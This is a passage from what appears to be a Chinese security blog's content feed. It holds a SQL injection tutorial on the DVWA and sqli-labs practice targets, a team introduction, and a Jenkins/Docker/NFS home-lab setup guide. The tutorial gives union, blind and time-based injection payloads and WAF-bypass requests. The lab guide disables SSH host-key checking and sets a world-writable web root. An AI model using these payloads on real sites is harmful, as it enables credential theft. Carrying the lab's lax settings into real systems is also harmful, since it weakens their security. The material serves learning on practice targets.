库中:\nSCHEMATA表存储了数据库中的所有库信息，\nTABLES表存储数据库中的表信息，包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。\nCOLUMNS表存储表中的列信息，包括表有多少列、每个列的类型等\n于是乎，我们可以通过元数据去查询库名，表名和列名\n查询库名\n1\u0026#39; and 1=2 union select 1,schema_name from information_schema.schemata # 查看dvwa库中的所有表名\n1\u0026#39; and 1=2 union select 1,table_name from information_schema.tables where table_schema= \u0026#39;dvwa\u0026#39;# 作为一个黑客猫猫，肯定关心存储管理员用户与密码信息的表;)\n接下来就是查询users表中所有的列\n1\u0026#39;and 1=2 union select 2,column_name from information_schema.columns where table_schema= \u0026#39;dvwa\u0026#39; and table_name= \u0026#39;users\u0026#39;# 最后，就可以拿到小猫咪攻击者想要的数据了\n啧啧啧，谁家的小猫咪这么坏\n啊，不好! 喵星的机密暴露了\n咳咳咳，不皮了\n查询user和password两列的信息\n1\u0026#39;and 1=2 union select user,password from dvwa.users# 布尔型盲注 为什么叫做布尔型盲注?\n\u0026ndash;因为只提示是或者否\n保持DVWAlow的安全级别, 去到 SQL Injection (Blind)页面\n尝试显注中的方法 寄.\n输入单引号不会报错了，仅仅提示用户名不在数据库中\n思考新方法 如果把通过SQL注入查询数据库中内容比作问一个人问题，\n显注就是问他什么这个人都直接回答，\n布尔型盲注就是你只能问这个人xxx是不是这个问题的答案，他只会回答是或者否\n所以面对布尔型注入，我们需要\u0026hellip;\n一个一个尝试\n库(表，列，数据)的数量,\n库名(表名，列名，数据)的长度,\n库名(表名，列名，数据)每个字母\n不得不说，这种情况手工真的是太费劲了= =\n某暴躁的脚本小猫: 哪那么多事？！直接sqlmap一把梭\n检测注入点 我们分别在输入框中输入1,1' and 1=1#,1' and 1=2#\n如果payload被带进数据库执行并产生歧义的话，1和1' and 1=1#\n返回的结果应该是一样的，而和1' and 1=2#的结果不一样\n所以得出结论，该处存在SQL注入漏洞\n获取数据 还是按照显注的思路一层一层获取数据，不过多了猜解的过程\n我们先来通过user()函数获取数据库用户名\n由于我们需要一个一个字符猜(substring())，我们先得知道用户名的总长度(length())\n这个猜的范围有亿点点大啊\u0026hellip;\n二分法偷懒 没关系，我们可以把大范围通过二分法缩小，这样就能减少工作量了\n(也就是偷个小懒)\n1\u0026#39; and length(user())\u0026gt;5# 输入上面的语句返回User ID exists in the database\n说明用户名的长度是大于5的\n1\u0026#39; and length(user())\u0026gt;20# 同理，输入上面的语句返回User ID is MISSING from the database说明用户名的长度是小于20的\n通过这样的方法，我们很快就能找到用户名的长度是14\n1\u0026#39; and length(user())=14# 接下来就要猜每一个字母了\n我们可以利用字符ASCII值的大小进行二分\n1\u0026#39; and substring(user(),1,1)\u0026gt;\u0026#39;a\u0026#39;# 1\u0026#39; and substring(user(),1,1)\u0026lt;\u0026#39;z\u0026#39;# 可见，用户名第一个字母是在小写a到小写z之间的\n接着就一个一个猜字母吧QwQ\n1\u0026#39; and substring(user(),1,1)=\u0026#39;r\u0026#39;# 1\u0026#39; and substring(user(),2,1)=\u0026#39;o\u0026#39;# 1\u0026#39; and substring(user(),3,1)=\u0026#39;o\u0026#39;# 1\u0026#39; and substring(user(),4,1)=\u0026#39;t\u0026#39;# 1\u0026#39; and substring(user(),5,1)=\u0026#39;@\u0026#39;# 1\u0026#39; and substring(user(),6,1)=\u0026#39;l\u0026#39;# 1\u0026#39; and substring(user(),7,1)=\u0026#39;o\u0026#39;# 1\u0026#39; and substring(user(),8,1)=\u0026#39;c\u0026#39;# 1\u0026#39; and substring(user(),9,1)=\u0026#39;a\u0026#39;# 1\u0026#39; and substring(user(),10,1)=\u0026#39;l\u0026#39;# 1\u0026#39; and substring(user(),11,1)=\u0026#39;h\u0026#39;# 1\u0026#39; and substring(user(),12,1)=\u0026#39;o\u0026#39;# 1\u0026#39; and substring(user(),13,1)=\u0026#39;s\u0026#39;# 1\u0026#39; and substring(user(),14,1)=\u0026#39;t\u0026#39;# 最后，我们推出用户名是root@localhost\n同理，其他几个函数也是如此操作，这里不过多赘述\n层层推进 接下来就是库名了，这里要注意比前面的推测内置函数结果的多一个步骤\n就是猜数据库的数量\n1\u0026#39; and (select count(schema_name) from information_schema.schemata) =6 # 然后就是常规操作，上就是了(\n注入第一个库名长度\n1\u0026#39; and length((select schema_name from information_schema.schemata limit 0,1))=18 # 小Tip:\nlimit 0,1代表截取第一行。\nlimit 0,2代表截取前两行，limit 1,1，代表截取第二行。\nlimit 2,3代表截取从第三行到第五行。\n然后注入第一个库名\n1\u0026#39; and substring((select schema_name from information_schema.schemata limit 0,1),1,1)=\u0026#39;i\u0026#39; # 1\u0026#39; and substring((select schema_name from information_schema.schemata limit 0,1),2,1)=\u0026#39;n\u0026#39; # ... ... ... 注入其他库名把limit后面的东西改掉了好了，不写了= =\n注入表名\n1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39;)=2 # 1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 0,1))=9 # 1\u0026#39; and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=\u0026#39;g\u0026#39; # 1\u0026#39; and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=\u0026#39;u\u0026#39; # 1\u0026#39; and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=\u0026#39;e\u0026#39; # ... ... ... 注入列名\n1\u0026#39; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;)=8 # 1\u0026#39; and length((select column_name from information_schema.columns where table_schema= \u0026#39;dvwa\u0026#39; and table_name= \u0026#39;users\u0026#39; limit 0,1))=7# 1\u0026#39; and length((select column_name from information_schema.columns where table_schema= \u0026#39;dvwa\u0026#39; and table_name= \u0026#39;users\u0026#39; limit 3,1))=4# 1\u0026#39; and length((select column_name from information_schema.columns where table_schema= \u0026#39;dvwa\u0026#39; and table_name= \u0026#39;users\u0026#39; limit 4,1))=8# 1\u0026#39; and (substr((select column_name from information_schema.columns where table_schema= \u0026#39;dvwa\u0026#39; and table_name= \u0026#39;users\u0026#39; limit 3,1),1,1))=\u0026#39;u\u0026#39;# 1\u0026#39; and (substr((select column_name from information_schema.columns where table_schema= \u0026#39;dvwa\u0026#39; and table_name= \u0026#39;users\u0026#39; limit 3,1),2,1))=\u0026#39;s\u0026#39;# 1\u0026#39; and (substr((select column_name from information_schema.columns where table_schema= \u0026#39;dvwa\u0026#39; and table_name= \u0026#39;users\u0026#39; limit 3,1),3,1))=\u0026#39;e\u0026#39;# 1\u0026#39; and (substr((select column_name from information_schema.columns where table_schema= \u0026#39;dvwa\u0026#39; and table_name= \u0026#39;users\u0026#39; limit 3,1),4,1))=\u0026#39;r\u0026#39;# 最后就是看数据\n1\u0026#39; and (select count(*) from dvwa.users)=5# 1\u0026#39; and length((select user from users limit 0,1))=5# 1\u0026#39; and substr((select user from users limit 0,1),1,1)=\u0026#39;a\u0026#39; # ... ... ... 通过Burp自动化 不得不说，即使是二分法工作量依然很巨\n实际上，其中很多遍历工作可以交给Burp自动完成\n比如说，我想要看到users表user列中的第一个数据.\n我们可以先随便写一个payload,\n1\u0026#39; and substr((select user from users limit 0,1),1,1)=\u0026#39;a\u0026#39;# 然后Burp抓包\n扔进Intruder模块\n把中间一个1和a作为参数，然后选择Cluster bomb模式\n对每个字符进行遍历\n每个字符可能是a-z\nStart Attack!\n最后将成功的筛选出来并进行排序\n美滋滋，数据跃然窗口上(什\n时间型盲注 为什么叫时间型\n\u0026ndash;因为依据返回结果是否有延迟来判断\n打开sqli-labs靶场的第九关\n我们发现参数id无论是1,1' and 1=1还是1' and 1=2提示的结果都是一样的\n继续思考 现在没有报错了，也没有提示是或者否了\n我们试想一下，我们可以让数据库:\n如果判断内容为真就延迟一段时间\n如果判断内容为假就不进行延迟操作\n这就可以引出一种新的注入方式:时间型盲注\n用上面问人问题的例子来讲的话,就是问他是不是xxx的时候，如果是，那个人会结巴= =\n时间型盲注与布尔型盲注的区别在于，时间型盲注是利用sleep()或benchmark()等函数让数据库执行的时间变长\n这里需要用到一个函数if()\n比如:if(a,b,c)表明\n如果a为真则返回值为b,否则返回值为c\n注入案例演示 由于时间型盲注和和布尔型盲注逻辑上类似，\n区别就是一个是依照网页输出判断是否，一个是依照返回时间判断是否\n这里不再继续演示具体步骤\n举一个时间型盲注的糖炒栗子例子\n1\u0026#39; and if(length(database())\u0026gt;1,sleep(5),1)--+ 大意就是:如果数据库名字长度大于1，就延迟5秒，否则if语句返回1(也就是不延迟)\n我们可以看到这里发生了延迟，证明存在时间型盲注\n至于其他查询库名，表名等等的操作，基本逻辑与布尔型盲注类似，就是需要在原先逻辑上加一个if判断，要是结果为真就延迟，否则不延迟\nTip:这个延迟的时间最好不要太长(浪费时间)或者太短(无法分辨)\n交SRCの小技巧 除了跑SQLmap之外，还有一个非常直接证明SQL注入的好方法\n就是用一个时间盲注payload放进burp的repeater,然后趁延迟的时候截图\n就可以轻松证明存在SQL注入\n实验中发现の小注意点 强烈建议不要用Win搭建渗透测试环境 为什么?\n如果你不想要BUG满天飞的话就建议这样\u0026hellip; 即答)\nIllegal mix of collations for operation \u0026lsquo;UNION\u0026rsquo; 又到了激动人心的解决报错的环节了.QwQ.\n谷歌一下，这个错大概是在爆表名的时候不同数据库的字段编码不同的原因= =\n相同字段的编码为 utf8_general_ci 与 utf8_unicode_ci，就会报Illegal mix of collations for operation “UNION”的错误。\n由于information_schame.tables中的table_name的编码为 utf8_general_ci，而union前的字段编码为utf8_unicode_ci, 导致union前后编码分别为utf8_unicode_ci 与 utf8_general_ci ，所以会报错。\n至于解决方案嘛\n再找一个编码合适的注入点\n直接上盲注,不用UNION (推荐方法)\nWAF绕过 本机DVWA配上安全狗狗\n从前有一只黑客猫想要入侵一个网站，瑟瑟发抖的网站请来了安全狗\u0026hellip;\n然后\u0026hellip;\n一场喵喵队和汪汪队的大战拉开帷幕\u0026hellip;\n检测UNION SELECT 单独的UNION或者单独的SELECT是不会拦截的，只有这两个家伙在一起的时候才会拦截，而且UNION和SELECT中间无论加什么都会拦截\n尝试了大小写 (这个方法目前应该是废了，要是绕不过那WAF纯属有大病了) ，URL编码，注释，内联注释，都寄了;(\nGET\u0026ndash;\u0026gt;POST 灵机一动，要不换个请求方式\n哈哈，不出所料，居然用POST请求就绕过去了\nPOST /vulnerabilities/sqli/ HTTP/1.1 ... ... id=-1\u0026#39;+%75%6e%69%6f%6e%20%73%65%6c%65%63%74+1,2%23\u0026amp;Submit=Submit P.S. 不用URL编码也可以0.0\n检测database(),user()等函数 之前的POST+URL编码居然废了\n以database()为例\n大概分析了一下，是database()这一坨在一起的时候才会拦截，\n尝试拼接逝世看吧0.0\nconcat拼接(逝世了) 莫名想到课上讲过concat()字符拼接\n但终究它还是拼成了字符!!!\n逝世了，因为他是字符，起不到函数的作用了= =\n利用函数名\u0026quot;feature\u0026quot;进行拼接 在无意中发现database()和database ()都是可以执行的\n唔\u0026hellip;..既然这样我们岂不是能利用这个空格进行ByPass\n试试看!\nPOST /vulnerabilities/sqli/ HTTP/1.1 ... ... id=-1\u0026#39;+%75%6e%69%6f%6e%20%73%65%6c%65%63%74+1,database%20()%23\u0026amp;Submit=Submit 同理，用连接符\u0026quot;+\u0026ldquo;也可以绕过成功\nPOST /vulnerabilities/sqli/ HTTP/1.1 ... ... id=-1\u0026#39;+%75%6e%69%6f%6e%20%73%65%6c%65%63%74+1,database+()%23\u0026amp;Submit=Submit 绕过SELECT A FROM B格式检测 经过了多次疯狂试探后，发现只有在完整的(指两个关键字没有被分割或者缺失/多余字母) 的SELECT和FROM后面同时有内容(一些特殊字符除外)WAF才会WOOF拦截.\nRound 1: 替换空格 把空格换成各种奇形怪状的格式，以及用注释替代空格\n一个字，寄.\nRound 2: SELECT和FROM用注释劈开 寄.虽说绕过去了，但语句不被识别了，直接报错\u0026hellip;\n猜想原因: 注释/**/相当于空格，关键词被空格分开了自然无法执行了= =\nRound 3: 使用内联注释+URL编码的盲注payload 喵哈哈哈哈~~,终于ok了\nPOST /vulnerabilities/sqli/ HTTP/1.1 ... ... id=1\u0026#39;+and+(/*!40000%53elect*//**/count(table_name)+from+information_schema.tables+where+table_schema=\u0026#39;dvwa\u0026#39;)=2%23\u0026amp;Submit=Submit ref https://m.freebuf.com/articles/web/288401.html\nhttp://book.fsec.io/\n","date":"2022-08-29T13:25:06+08:00","image":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover_hub39257f7b520a72e81a71654a57446e0_105468_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/","title":"Web安全:SQL注入基础知识和简单绕过笔记"},{"content":"ME0W00F 嘿嘿，当我写这篇文章的时候就标志着这个团队正式成立了 - -\n至于其他仪式啥的，就不必要了awa\n(摆烂了\u0026hellip; 也没什么不好的)\n既然标题写的是\u0026quot;介绍\u0026quot;，接下来就简单的介绍一下吧\n诶嘿~~\n团队成员 目前三人\nKiraPGR(喵喵酱) \u0026ndash; 也就是可爱的我\nGem_JAyus(汪汪酱) \u0026ndash; 一起学网安de好兄弟 :\u0026gt;\nWeepingDogel(小犬酱) \u0026ndash; Arch Linux大佬\nHmmm, 目前并不打算让其他人加入，因为感觉合作的话人太多容易乱\u0026hellip;\n关于这个名字 灵感嘛= =\n是从喵喵和汪汪来的惹\nMeow + Woof (\n为什么想要组队捏 对于我个人而言的话我其实是想找一个一起学习的伙伴嘛= =\n找共同兴趣爱好的人一起学习会有动力(\n说不定能把大家都卷成大佬 bushi)\n其他的一些东西 申请了一个域名↓\nme0w00f.eu.org 目前还没有投入使用\n以后可能会做个主页，也可能搞几个子域名放实验的东西或者博客\n我的博客也可能之后会迁移到这个域名\nThe End = = 水完了，又可以咕咕咕啦\n","date":"2022-07-14T21:27:40+08:00","image":"https://blog.nanosec.site/p/%E5%9B%A2%E9%98%9Fme0w00f%E4%BB%8B%E7%BB%8D/cover_huf0d3b7170fd2f9a3b8d4f4afd904df62_4209345_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/%E5%9B%A2%E9%98%9Fme0w00f%E4%BB%8B%E7%BB%8D/","title":"团队Me0w00f介绍"},{"content":"NanoSec\u0026ndash;模拟企业网络搭建 Part 1\u0026ndash;规划 由于实验条件限制，共准备5台机器来测试:\nJenkins\nGitLab + NFS\nDatabase\nWeb Servers\nNginx_Reverse_Proxy\n其中机器3,4,5中服务均用Docker进行部署，且用Jenkins进行自动化安装Docker环境, 启动并配置容器;)\n最后实现效果预测:访问Nginx反向代理可以访问到真实Web服务器的页面，Web服务器能正常访问数据库，代码以及部分配置文件使用GitLab储存，数据定时备份到备份服务器\nPart 2\u0026ndash;实验过程 本实验使用系统均为CentOS和Rocky Linux(新一代的CenOS ?)\n准备工作 首先配置好5台机器的IP\nJenkins 192.168.245.137\nGitLab+NFS 192.168.245.129\nWebServers 192.168.245.149\nDataBase 192.168.245.150\nNginx反向代理 192.168.245.151\nGitLab安装 由于直接配置GitLab时我本地各种报错姿势(\n就采用Docker配置了，其实Docker配置反倒方便一些= =\nsudo docker run --detach \\ --hostname IP or Domain \\ --env GITLAB_OMNIBUS_CONFIG=\u0026#34;external_url \u0026#39;http://IP or Domain/\u0026#39;; gitlab_rails[\u0026#39;lfs_enabled\u0026#39;] = true;\u0026#34; \\ --publish 443:443 --publish 80:80 --publish 2222:22 \\ --name gitlab \\ --restart always \\ --volume $GITLAB_HOME/config:/etc/gitlab \\ --volume $GITLAB_HOME/logs:/var/log/gitlab \\ --volume $GITLAB_HOME/data:/var/opt/gitlab \\ --shm-size 256m \\ gitlab/gitlab-ee:latest 然后就直接在浏览器访问该机器IP并按照提示配置，这里不再过多赘述\n至于使用方法嘛。。。和世界上最大的同性交友平台GitHub差不多\nJenkins安装 由于Jenkins依赖Java环境，先安装Java\nyum -y install java-11-openjdk 接下来导入Jenkins官方源\nsudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo 导入Jenkins密钥\nsudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key 终于可以安装啦uwu\nyum install jenkins 安装完之后可不要忘记启动并启用服务哦 ;D\nP.S. 启动服务:使服务立刻运行起来，启用服务:使服务开机自启\nsystemctl start jenkins systemctl enable jenkins 最后即可在ip:8080访问Jenkins了喵\nJenkins配置 在自定义Jenkins那步选择安装推荐的插件，这样你之后可以少很多折腾\n然后就是安装其他配置自动化需要的插件(Ansible, SSH)了\n去到http://ip:8080/pluginManager/(即Manage Jenkins下的Plugin Manager)\n然后在Available一栏搜索SSH和Jenkins\n一个小提醒:SSH插件存在已知漏洞，从安全角度考虑生产环境请慎用(指可以找到这些漏洞的临时缓解方案)，在实验里我偷个小懒\n要是想要节省时间，选中两个插件之后选择Install without restart\n安装完成之后该配置各个插件了uwu\nSSH 去到http://ip:8080/configure或在网页点击Manage Jenkins \u0026ndash;\u0026gt;Configure System\n在这一界面下滑直到看到SSH remote hosts\n然后点击下方的Add进行配置\nHostname:主机名，一般填写目标主机ip(写一个)\nPort：ssh端口，默认22\nCredentials：认证信息，即为通过ssh远程连接目标主机的用户名、密码\n这里注意，如果是第一次使用，需要添加新的认证信息\n如果你想使用用户名，密码来认证的化，选择Username with password,然后填好你的用户名，密码\n注意，你要用自动化配置的几台机器的账号密码须一样\n然后点下方的check connection检查连接,如果看到提示Successfull connection即为连接成功，然后点击Apply- -\u0026gt;Save即可完成ssh配置\nAnsible 如果要使用Ansible插件，你必须机器(注意是装有Jenkins的机器)上安装有Ansible\nTip:Ansible是一个批量自动化管理多台机器的工具\nAnsible在epel源里才有，所以先安装epel源\nyum -y install epel-release 安装Ansible\nyum -y install ansible 下面配置Ansible插件\n去到http://ip:8080/configureTools/，或者网页上Manage Jenkins - -\u0026gt; Global Tool Configuration\n下划到Ansible区域，点击Add Ansible\n分别添加ansible和ansible-playbook,默认他们的路径都安装在/usr/bin下，如果不放心可以用which命令检查\nwhich ansible which ansible-playbook 注意这里的安装路径写到可执行文件所在目录\n比如说我的ansible是/usr/bin/ansible,我只需要填/usr/bin\nAnsible有个小坑，就是它不会说\u0026quot;是\u0026quot;\n为什么这么说捏\n因为当SSH询问是否需要将新的主机添加到known_hosts时Ansible无法回应,那就只有报错辣;(\n嘛= =那就帮帮Ansible吧，让它省去烦人的说\u0026quot;是\u0026quot;的步骤\n在装有Jenkins和Ansible的机器上完成:\nvi /etc/ssh/ssh_config 然后将/etc/ssh/ssh_config 内容中的StrictHostKeyChecking 值为no ,让机器自动接受证书\n注意去掉这一行前的注释符#\n别忘了关键的重启一步喵~~\nsystemctl restart sshd NFS安装和配置 安装 由于rpc-bind是NFS的依赖项，必须先安装\ndnf -y install rpcbind nfs-utils 然后启动rpc-blind和NFS服务(rpc-bind服务一定先启动)\nsystemctl start rpcbind systemctl start nfs-server systemctl enable rpcbind systemctl enable nfs-server 配置 由于我们的NFS是用来备份数据库的，所以建一个名为DB_Backup的备份文件夹\nmkdir /DB_Backup 然后修改配置文件\nvi /etc/exports 输入如下内容:\n/DB_Backup 192.168.245.1/24(sync,ro) 192.168.245.150(sync,rw,no_root_squash) 至于配置文件里里东西的含义，可以看下文\n最前面的是用来存放备份文件的目录绝对路径\n地址可以使用完整IP或网段，例如10.0.0.8或10.0.0.0/24，10.0.0.0/255.255.255.0当然也可以地址可以使用主机名，DNS解析的和本地/etc/hosts解析的都行，支持通配符，例如：*.nanosec.site\n关于括号里的权限设置\nrw：read-write，可读写;\nro：read-only，只读;\nsync：文件同时写入硬盘和内存;\nasync：文件暂存于内存，而不是直接写入硬盘;\nno_root_squash：NFS客户端连接服务端时如果使用的是root的话，那么对服务端分享的目录来说，也拥有root权限;\nroot_squash：NFS客户端连接服务端时如果使用的是root的话，那么对服务端分享的目录来说，拥有匿名用户权限，通常他将使用nobody或nfsnobody身份;\nall_squash：不论NFS客户端连接服务端时使用什么用户，对服务端分享的目录来说都是拥有匿名用户权限;\nanonuid：匿名用户的UID值，通常是nobody或nfsnobody，可以在此处自行设定;\nanongid：匿名用户的GID值\n出于安全角度角度，只给192.168.245.150即存放数据库的机器写权限\n当然，no_root_squash参数最好也不要使用\n编辑配置文件完成后，需要运行exportfs重新发布所共享的目录\n当然也可以重启服务，不过记得先重启rpcbind\n实现自动化安装环境 我们梳理一下思路，我们现在大概可以想到两种方案\n方案猜想 第一种就是直接用SSH插件:不断添加构建步骤在不同机器上进行安装\n这个方法想想是没什么问题，但绝对不是适合我们这种懒人的哒= =\n因为一旦设备数足够多，工作量就会巨大，费时费力\n第二种方法则是通过ansible插件结合Jenkins和ansible来完成批量自动化，用一个构建步骤就可以在n台机器上运行脚本，而我们只需要提供运行的命令和所有机器的ip就好了\n绝对是效率贼高的偷懒摸鱼小妙招\n开始施工awa ok,现在我们想好了方案，接下来要做的就是新建一个Jenkins项目然后进行配置\n回到Dashboard- -\u0026gt;New item新建一个项目\n给项目起一个合适的名字(比如说用来安装环境的项目叫做Install),然后选Freestyle Project,然后再傻瓜式地点OK\n然后Add build step-\u0026gt;Invoke Ansible Ad-Hoc Command(调用Ansible临时命令)\n接下来这样填空\nAnsible installation\u0026ndash;\u0026gt;ansible\nHost pattern填all\nInventory-\u0026gt;Inline content\nP.S.如果你不需要使用编程语言来生成IP列表,\n请不要勾选下方的Dynamic inventory\nContent填你需要执行命令机器的IP,一行一个 Module填shell Module arguments or command to execute填你要执行的命令,我们这里是要为3台机器配置Docker运行环境 yum install -y yum-utils yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo yum install -y docker-ce docker-ce-cli --allowerasing systemctl start docker systemctl enable docker docker pull centos Credentials选我们前面在配置SSH插件的适合创建的那个 其他的东西保持默认 然后就是Apply+Save一把梭= =\n然后回到项目主界面之后捏，点Build Now\n就是那个上面有绿绿三角形的钟~~(要是你理解为其他的东西也可以~~\n要是你运气好，没报错，就能看到一个绿绿的勾\n要是BUG满天飞，就会是一个红红火火的x\n假设现在已经运行成功并且没有任何报错，右键build编号，点Console Output查看控制台输出\n到现在为止，我们3台机器上已经安装好了Docker环境并拉去了centos镜像\n部署Web Server 我的内心是崩溃的，Docker对于我这种菜狗就全都是坑 = =\n思路 我这边的实验能是打算用Docker搭一个LNMP架构，再安装WordPress,\n当然啦，用Docker也可以搭建其他网站架构\nJenkins新建一个新项目 建项目的流程和上面配置自动化安装基本一样，就是把机器ip和代码替换掉就可以了\nLNMP 在这个过程中真的踩到无数的坑，可能是因为Docker这个镜像精简的feature吧，很多最最基础的东西都没有= =\n不管怎么说，先启动Docker,再映射到一个吉利的端口 (顿时接地气了起来，咳咳= =\ndocker run --name LNMP -p 8888:80 -d -t centos:latest 至于为什么不直接pull nginx的镜像，是因为想统一用yum包管理器，而nginx镜像是apt包管理器= =\n第一个坑:容器无法正常启动 你会注意到上面启动容器的命令里包含了-t参数，\n为什么咧????\n\u0026ndash; 因为不加上centos镜像启动的容器会立刻停止运行\n第二个坑:无法使用Yum源 太狗了! 容器里的yum源用不了= =\n报错如下:\nFailed to set locale, defaulting to C.UTF-8 CentOS Linux 8 - AppStream 57 B/s | 38 B 00:00 Error: Failed to download metadata for repo \u0026#39;appstream\u0026#39;: Cannot prepare internal mirrorlist: No URLs in mirrorlist 看到这个报错，我直接炸毛= =\n刚开始还以为源的URL没有加上，后来发现是因为AppStream的mirrorlist里URL用不了\n在/etc/yum.repos.d/CentOS-Linux-AppStream.repo文件中官方友情提醒了我们\n# If the mirrorlist does not work for you, you can try the commented out # baseurl line instead. 所以我们只需要把mirrorlist那一行注释掉并且取消baseurl的注释\n因为我们是在Jenkins里自动化，很显然不能用vim,就改用下面这种方法\n注意:自动化也导致不能docker exec -ti 容器名 /bin/bash调出交互终端\ndocker exec -it LNMP sh -c \u0026#34;sed -i \u0026#39;s/mirrorlist/#mirrorlist/g\u0026#39; /etc/yum.repos.d/CentOS-*\u0026#34; docker exec -ti LNMP sh -c \u0026#34;sed -i \u0026#39;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g\u0026#39; /etc/yum.repos.d/CentOS-*\u0026#34; P.S. 使用sh -c \u0026quot;内容\u0026quot;的原因是不放在引号里Docker exec会把后面一团东东当成两条命令执行\n第三个坑:systemctl报错 在一番快乐的安装之后\ndocker exec -ti LNMP yum makecache docker exec -ti LNMP yum -y install nginx docker exec -ti LNMP yum -y install php* 该到了启动和启用服务的时候了\ndocker exec -ti LNMP systemctl start php-fpm docker exec -ti LNMP systemctl enable php-fpm docker exec -ti LNMP systemctl start nginx docker exec -ti LNMP systemctl enable nginx 然后\u0026quot;啪!\u0026ldquo;就是一个报错\n好家伙! systemctl都用不了!!! 震怒)\nSystem has not been booted with systemd as init system (PID 1). Can\u0026#39;t operate. Failed to connect to bus: Host is down 还好有GayHubGitHub上大佬的Docker systemctl替代品\ndocker exec -ti LNMP yum -y install wget docker exec -ti LNMP yum -y install python3 docker exec -ti LNMP sh -c \u0026#34;wget https://raw.githubusercontent.com/gdraheim/docker-systemctl-replacement/master/files/docker/systemctl3.py -O /usr/local/bin/systemctl\u0026#34; docker exec -ti LNMP sh -c \u0026#34;chmod +x /usr/local/bin/systemctl\u0026#34; 小提醒:GitHub的raw应该是被gfw给挡住了，所以可能要给Docker配置代理\n部署WordPress 因为我们要从GitHub拉取Wordpress源码(或者从内部的GitLab拉取代码)\n先给容器安装Git\ndocker exec -ti LNMP yum -y install git 然后再把原先nginx默认的一些网页文件删除\ndocker exec -ti LNMP sh -c \u0026#34;rm -rf /usr/share/nginx/html/*\u0026#34; 拉取WordPress\ndocker exec -ti LNMP sh -c \u0026#34;git clone https://github.com/WordPress/WordPress.git /usr/share/nginx/html/\u0026#34; 然后就可以访问机器ip开始安装WordPress啦\n又双叒叕踩坑啦:WordPress权限不足 你需要在Jenkins中提前让WordPress目录对于所有用户可写\ndocker exec -ti LNMP sh -c \u0026#34;chmod -R 777 /usr/share/nginx/html/\u0026#34; 否则就不能自动化了qeq\n输入已经配置好的数据库信息\n数据库配置见下文\n自动化花里胡哨 嘿嘿，最后给配个主题，让我的实验kawaii起来~~\ndocker exec -ti LNMP sh -c \u0026#34;git clone https://github.com/mashirozx/sakura.git /usr/share/nginx/html/wp-content/themes/Sakura/\u0026#34; 附上代码 docker run --name LNMP -p 8888:80 -d -t centos:latest docker exec -it LNMP sh -c \u0026#34;sed -i \u0026#39;s/mirrorlist/#mirrorlist/g\u0026#39; /etc/yum.repos.d/CentOS-*\u0026#34; docker exec -ti LNMP sh -c \u0026#34;sed -i \u0026#39;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g\u0026#39; /etc/yum.repos.d/CentOS-*\u0026#34; docker exec -ti LNMP yum makecache docker exec -ti LNMP yum -y install nginx docker exec -ti LNMP yum -y install php* docker exec -ti LNMP yum -y install wget docker exec -ti LNMP yum -y install python3 docker exec -ti LNMP yum -y install git docker exec -ti LNMP sh -c \u0026#34;wget https://raw.githubusercontent.com/gdraheim/docker-systemctl-replacement/master/files/docker/systemctl3.py -O /usr/local/bin/systemctl\u0026#34; docker exec -ti LNMP sh -c \u0026#34;chmod +x /usr/local/bin/systemctl\u0026#34; docker exec -ti LNMP systemctl start php-fpm docker exec -ti LNMP systemctl enable php-fpm docker exec -ti LNMP systemctl start nginx docker exec -ti LNMP systemctl enable nginx docker exec -ti LNMP sh -c \u0026#34;rm -rf /usr/share/nginx/html/*\u0026#34; docker exec -ti LNMP sh -c \u0026#34;git clone https://github.com/WordPress/WordPress.git /usr/share/nginx/html/\u0026#34; docker exec -ti LNMP sh -c \u0026#34;chmod -R 777 /usr/share/nginx/html/\u0026#34; docker exec -ti LNMP sh -c \u0026#34;git clone https://github.com/mashirozx/sakura.git /usr/share/nginx/html/wp-content/themes/Sakura/\u0026#34; 部署MariaDB数据库 老规矩:Jenkins新建项目 不过有了前面的经验之后，这边可以偷个小懒，嘿嘿嘿\n细心的朋友们可以发现，在新建项目的时候还可以用之前的项目作为模版\n我们就以刚刚配置的Web Server作为模板\n点OK创建之后你会看见和一个和Web Server项目配置相同的新项目\n接下来也是老样子:修改IP和代码\n配置数据库 现在在之前配置Web Server的代码基础上进行修改\nP.S.:建议把容器名进行修改，并起一个易于识别的名字\n3306端口 既然是MariaDB数据库(和MySQL基本相同)，那就需要映射3306到端口\n为了之后备份的方便，我们映射一个目录/mnt/backup\nmkdir /mnt/backup docker run --name MySQL -p 3306:3306 -d -t -v /mnt/backup:/mnt/backup centos:latest 关于安装 这里轻松多啦，我们已经解决了前面所提及的几个大坑，\n仔细思考，因为在这里只需要部署数据库，前面安装PHP和Nginx的代码可以干掉啦qwq\n注意：记得保留前面解决坑所需的代码= =\n然后换成安装MariaDB的代码\ndocker exec -ti MySQL yum -y install mariadb mariadb-server 启动并启用数据库服务\ndocker exec -ti MySQL systemctl start mariadb docker exec -ti MySQL systemctl enable mariadb 配置 因为我们是自动化，所以不能用之前一贯的方法调出MariaDB的交互式控制台\n那么，就直接在命令行执行SQL语句吧\nmysql -u 用户名 -p密码 -e \u0026#34;语句\u0026#34; 注意初始状态的MariaDB是没有密码的，\n毕竟我们是网安人嘛，为了安全性肯定要设置密码= =\ndocker exec -ti MySQL mysql -e 